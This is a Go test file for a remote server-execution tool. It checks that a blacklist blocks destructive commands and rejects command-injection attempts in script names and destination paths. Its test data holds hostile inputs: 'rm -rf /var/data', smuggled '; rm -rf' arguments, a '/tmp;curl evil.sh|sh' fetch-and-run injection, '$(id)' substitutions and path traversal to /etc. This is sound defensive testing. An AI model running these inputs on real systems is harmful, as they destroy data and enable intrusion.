package handler

import (
	"context"
	"database/sql"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/cangyunye/go-owl/cmd/plugins/serve/model"
	"github.com/cangyunye/go-owl/cmd/plugins/serve/store"
	ai2 "github.com/cangyunye/go-owl/internal/ai"
	"github.com/cangyunye/go-owl/internal/control/blacklist"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	_ "modernc.org/sqlite"
)

func TestExecCreate_DangerousCommandBlocked(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id": "test-node",
		"command": "rm -rf /var/data",
	})
	require.Equal(t, http.StatusForbidden, w.Code)
	assert.Contains(t, w.Body.String(), "blocked")

	var resp struct {
		Blocked bool `json:"blocked"`
		Matches []struct {
			Node    string `json:"node"`
			Pattern string `json:"pattern"`
			Line    string `json:"line"`
		} `json:"matches"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp))
	require.True(t, resp.Blocked)
	require.NotEmpty(t, resp.Matches)
	assert.Equal(t, "test-node", resp.Matches[0].Node)
	assert.NotEmpty(t, resp.Matches[0].Pattern)
	assert.Contains(t, resp.Matches[0].Line, "rm -rf")
}

func TestExecCreate_DangerousCommandConfirmed(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id":          "test-node",
		"command":          "rm -rf /var/data",
		"danger_confirmed": true,
	})
	require.NotEqual(t, http.StatusForbidden, w.Code)
}

func TestExecCreate_SafeCommandNotBlocked(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id": "test-node",
		"command": "uptime",
	})
	require.NotEqual(t, http.StatusForbidden, w.Code)
}

func blacklistTestNodeDB(t *testing.T) *sql.DB {
	t.Helper()
	db, err := sql.Open("sqlite", ":memory:")
	require.NoError(t, err)
	db.SetMaxOpenConns(1)
	t.Cleanup(func() { db.Close() })

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS nodes (
		id TEXT PRIMARY KEY, name TEXT, address TEXT, port INTEGER DEFAULT 22,
		user TEXT, password TEXT, ssh_key TEXT, status TEXT DEFAULT 'unknown',
		groups TEXT DEFAULT '[]', labels TEXT DEFAULT '{}',
		proxy_jump TEXT DEFAULT '', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
		updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
	)`)
	require.NoError(t, err)
	_, err = db.Exec(`INSERT INTO nodes (id, name, address, port, user, status) VALUES
		('test-node', 'test-node', '127.0.0.1', 22, 'root', 'online')`)
	require.NoError(t, err)
	return db
}

func TestWebCommandExecutor_ExecuteOnNode_DangerousBlocked(t *testing.T) {
	db := blacklistTestNodeDB(t)
	e := &webCommandExecutor{
		ssh:   &sshExecutor{db: db},
		check: blacklist.NewDefaultChecker(),
	}

	result, err := e.ExecuteOnNode("test-node", "rm -rf /var/data", 0)
	require.Error(t, err)
	var blocked *blacklist.BlockedError
	require.ErrorAs(t, err, &blocked)
	require.NotNil(t, result)
	assert.Equal(t, -1, result.ExitCode)
	assert.Contains(t, result.Output, "黑名单")
}

func TestWebExecutor_ExecuteCommand_DangerousBlocked(t *testing.T) {
	db := blacklistTestNodeDB(t)

	ts := store.NewTaskStore(db)
	require.NoError(t, ts.Init(t.Context()))
	trs := store.NewTransferRecordStore(db)
	require.NoError(t, trs.Init(t.Context()))
	prs := store.NewPlaybookRunStore(db)
	require.NoError(t, prs.Init(t.Context()))
	ns := store.NewNodeStore(db)
	pbs := store.NewPlaybookStore(db)
	require.NoError(t, pbs.Init(t.Context()))
	audit := store.NewAIAuditStore(db)
	require.NoError(t, audit.Init(t.Context()))

	e := NewWebExecutor(db, ts, trs, prs, ns, pbs, audit, NewKeyManager(), false)

	res, err := e.ExecuteCommand(adminCtx(t), ai2.ExecCommandParams{
		Nodes:   []string{"test-node"},
		Command: "rm -rf /var/data",
	})
	require.NoError(t, err)
	require.NotNil(t, res)
	assert.Contains(t, res.Text, "黑名单")
}

func TestWebExecutor_ExecuteScript_DangerousBlocked(t *testing.T) {
	db := blacklistTestNodeDB(t)

	ts := store.NewTaskStore(db)
	require.NoError(t, ts.Init(t.Context()))
	trs := store.NewTransferRecordStore(db)
	require.NoError(t, trs.Init(t.Context()))
	prs := store.NewPlaybookRunStore(db)
	require.NoError(t, prs.Init(t.Context()))
	ns := store.NewNodeStore(db)
	pbs := store.NewPlaybookStore(db)
	require.NoError(t, pbs.Init(t.Context()))
	audit := store.NewAIAuditStore(db)
	require.NoError(t, audit.Init(t.Context()))

	e := NewWebExecutor(db, ts, trs, prs, ns, pbs, audit, NewKeyManager(), false)

	res, err := e.ExecuteScript(adminCtx(t), ai2.ExecScriptParams{
		Nodes:  []string{"test-node"},
		Script: "#!/bin/bash\nrm -rf /var/data",
	})
	require.NoError(t, err)
	require.NotNil(t, res)
	assert.Contains(t, res.Text, "黑名单")
}

func newBlacklistTestWebExecutor(t *testing.T, db *sql.DB) *WebExecutor {
	t.Helper()
	ts := store.NewTaskStore(db)
	require.NoError(t, ts.Init(t.Context()))
	trs := store.NewTransferRecordStore(db)
	require.NoError(t, trs.Init(t.Context()))
	prs := store.NewPlaybookRunStore(db)
	require.NoError(t, prs.Init(t.Context()))
	ns := store.NewNodeStore(db)
	pbs := store.NewPlaybookStore(db)
	require.NoError(t, pbs.Init(t.Context()))
	audit := store.NewAIAuditStore(db)
	require.NoError(t, audit.Init(t.Context()))
	hs := store.NewHistoryStore(db)
	require.NoError(t, hs.Init(t.Context()))

	e := NewWebExecutor(db, ts, trs, prs, ns, pbs, audit, NewKeyManager(), false)
	e.History = hs
	return e
}

func TestWebExecutor_ExecuteScript_KeepFalseBenignScriptNotBlocked(t *testing.T) {
	db := blacklistTestNodeDB(t)
	e := newBlacklistTestWebExecutor(t, db)

	res, err := e.ExecuteScript(adminCtx(t), ai2.ExecScriptParams{
		Nodes:  []string{"test-node"},
		Script: "echo hi",
		Keep:   false,
	})
	require.NoError(t, err)
	require.NotNil(t, res)
	assert.NotContains(t, res.Text, "黑名单")
}

func TestWebExecutor_ExecuteScript_DangerousArgsBlocked(t *testing.T) {
	db := blacklistTestNodeDB(t)
	e := newBlacklistTestWebExecutor(t, db)

	res, err := e.ExecuteScript(adminCtx(t), ai2.ExecScriptParams{
		Nodes:  []string{"test-node"},
		Script: "#!/bin/bash\necho hello",
		Args:   "; rm -rf /var/data",
	})
	require.NoError(t, err)
	require.NotNil(t, res)
	assert.Contains(t, res.Text, "黑名单")
}

func TestExecCreate_ScriptWithDangerousArgsBlocked(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id":        "test-node",
		"mode":           "script",
		"script_content": "#!/bin/bash\necho hello",
		"script_args":    "; rm -rf /var/data",
	})
	require.Equal(t, http.StatusForbidden, w.Code)

	var resp struct {
		Blocked bool `json:"blocked"`
		Matches []struct {
			Node    string `json:"node"`
			Pattern string `json:"pattern"`
			Line    string `json:"line"`
		} `json:"matches"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp))
	require.True(t, resp.Blocked)
	require.NotEmpty(t, resp.Matches)
	assert.Equal(t, "test-node", resp.Matches[0].Node)
	assert.Contains(t, resp.Matches[0].Line, "rm -rf")
}

func TestExecCreate_ScriptWithDangerousArgsConfirmed(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id":          "test-node",
		"mode":             "script",
		"script_content":   "#!/bin/bash\necho hello",
		"script_args":      "; rm -rf /var/data",
		"danger_confirmed": true,
	})
	require.NotEqual(t, http.StatusForbidden, w.Code)
}

func TestExecCreate_ScriptUnclosedQuoteArgsBlocked(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id":        "test-node",
		"mode":           "script",
		"script_content": "echo \"",
		"script_args":    "; rm -rf /var/data",
	})
	require.Equal(t, http.StatusForbidden, w.Code)

	var resp struct {
		Blocked bool `json:"blocked"`
		Matches []struct {
			Node    string `json:"node"`
			Pattern string `json:"pattern"`
			Line    string `json:"line"`
		} `json:"matches"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp))
	require.True(t, resp.Blocked)
	require.NotEmpty(t, resp.Matches)
	assert.Equal(t, "test-node", resp.Matches[0].Node)
	assert.Contains(t, resp.Matches[0].Line, "rm -rf")

	w = execPOST(t, r, map[string]interface{}{
		"node_id":          "test-node",
		"mode":             "script",
		"script_content":   "echo \"",
		"script_args":      "; rm -rf /var/data",
		"danger_confirmed": true,
	})
	require.NotEqual(t, http.StatusForbidden, w.Code)
}

func TestExecCreate_ScriptSafeContentAndArgsNotBlocked(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id":        "test-node",
		"mode":           "script",
		"script_content": "echo rm",
		"script_args":    "-rf /data",
	})
	require.NotEqual(t, http.StatusForbidden, w.Code)
	assert.Equal(t, http.StatusAccepted, w.Code)
}

func TestExecCreate_DangerousScriptDestRejected(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	for _, dest := range []string{
		"/tmp;curl evil.sh|sh;x",
		"/tmp|evil",
		"/tmp/$(id)",
		"/tmp && touch /pwned",
		"relative/path",
		"/tmp/../etc",
	} {
		w := execPOST(t, r, map[string]interface{}{
			"node_id":        "test-node",
			"mode":           "script",
			"script_content": "echo hi",
			"script_dest":    dest,
		})
		require.Equal(t, http.StatusBadRequest, w.Code, "dest=%q", dest)
		assert.Contains(t, w.Body.String(), "script_dest")
	}
}

func TestExecCreate_DangerousScriptNameRejected(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	for _, name := range []string{"a;id.sh", "a|id.sh", "a$(id).sh", "../../../etc/x.sh", ".."} {
		w := execPOST(t, r, map[string]interface{}{
			"node_id":        "test-node",
			"mode":           "script",
			"script_content": "echo hi",
			"script_name":    name,
		})
		require.Equal(t, http.StatusBadRequest, w.Code, "name=%q", name)
	}
}

func TestExecCreate_ValidScriptDestAllowed(t *testing.T) {
	_, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	w := execPOST(t, r, map[string]interface{}{
		"node_id":        "test-node",
		"mode":           "script",
		"script_content": "echo hi",
		"script_name":    "deploy.sh",
		"script_dest":    "/opt/scripts",
	})
	require.Equal(t, http.StatusAccepted, w.Code)
}

func TestExecCreate_NodeUserScanErrorFailsClosed(t *testing.T) {
	db, h := execTestSetup(t)
	r := execRBACRouter(t, h)

	_, err := db.Exec(`INSERT INTO nodes (id, name, address, port, user, status) VALUES
		('null-user-node', 'null-user-node', '127.0.0.1', 22, NULL, 'online')`)
	require.NoError(t, err)

	w := execPOST(t, r, map[string]interface{}{
		"node_id": "test-node",
		"command": "uptime",
	})
	require.Equal(t, http.StatusInternalServerError, w.Code)
	assert.Contains(t, w.Body.String(), "query node users failed")
}

// V1 引擎（executePlaybookRun/executePlaybookTask）已删除，其黑名单
// 拦截语义由 V2 运行时链路（webCommandExecutor.CheckForExec）承接；
// 原任务级测试迁移为以下 V2 端到端等价断言。

func TestExecutePlaybookRunV2_CommandBlockedByBlacklist(t *testing.T) {
	const pbYAML = `
name: evil
execution_mode: fail_continue
tasks:
  - name: cleanup
    action: shell
    args:
      cmd: rm -rf /var/data
`
	h, rs, pbFile := newPlaybookEngineTestHandler(t, pbYAML)
	ssh := &fakeSSHRunner{user: "root"}
	h.sshRunner = ssh
	h.checker = blacklist.NewDefaultChecker()

	run, err := rs.Create(t.Context(), "pb-1", "evil", pbFile, []string{"n1"}, nil, "", false)
	require.NoError(t, err)

	h.executePlaybookRunV2(run.ID)

	run, err = rs.Get(t.Context(), run.ID)
	require.NoError(t, err)
	assert.Equal(t, model.RunStatusFailed, run.Status)
	assert.Empty(t, ssh.executedCommands(), "被拦截的命令不得发起任何 SSH 执行")

	found := false
	for _, s := range run.Results {
		if s.TaskName == "cleanup" && s.Status == "failed" && strings.Contains(s.Error, "黑名单") {
			found = true
		}
	}
	assert.True(t, found, "失败步骤必须携带黑名单拦截原因，实际: %+v", run.Results)
}

func TestExecutePlaybookRunV2_CommandSafeAllowed(t *testing.T) {
	const pbYAML = `
name: safe
execution_mode: fail_continue
tasks:
  - name: check
    action: shell
    args:
      cmd: uptime
`
	h, rs, pbFile := newPlaybookEngineTestHandler(t, pbYAML)
	ssh := &fakeSSHRunner{user: "root", results: map[string]fakeExecResult{
		"uptime": {output: "load ok", exitCode: 0},
	}}
	h.sshRunner = ssh
	h.checker = blacklist.NewDefaultChecker()

	run, err := rs.Create(t.Context(), "pb-1", "safe", pbFile, []string{"n1"}, nil, "", false)
	require.NoError(t, err)

	h.executePlaybookRunV2(run.ID)

	run, err = rs.Get(t.Context(), run.ID)
	require.NoError(t, err)
	require.Len(t, ssh.executedCommands(), 1, "安全命令应照常执行")
	assert.Equal(t, model.RunStatusCompleted, run.Status)
}

// adminCtx 返回带 admin 身份的 ctx（ctx 化后替代共享 userRole 注入）。
func adminCtx(t *testing.T) context.Context {
	t.Helper()
	return WithIdentity(context.Background(), ExecIdentity{Username: "admin", Role: "admin"})
}
